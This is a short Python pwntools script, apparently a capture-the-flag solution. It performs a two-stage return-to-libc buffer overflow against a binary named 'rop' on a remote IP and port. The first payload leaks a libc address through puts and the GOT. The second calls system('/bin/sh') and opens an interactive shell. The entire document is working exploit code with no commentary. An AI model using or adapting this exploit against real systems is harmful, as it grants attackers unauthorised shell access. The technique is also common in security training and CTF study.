from pwn import *

payload = b'A'*28
elf = ELF('./rop')
libc = ELF('leak_libc.so')
payload += p32(elf.sym['puts'])+p32(elf.sym['main'])+p32(elf.got['__libc_start_main'])

io = remote('128.199.234.122', 4300)
print(io.recv())
io.sendline(payload)
libc.address = u32(io.recv(4))-libc.sym['__libc_start_main']
print('LIBC: ', hex(libc.address))
print(io.recv())
print(io.recv())
payload = b'A'*28 + p32(libc.sym['system'])+p32(libc.sym['exit'])+p32(next(libc.search(b'/bin/sh')))
io.sendline(payload)
io.interactive()
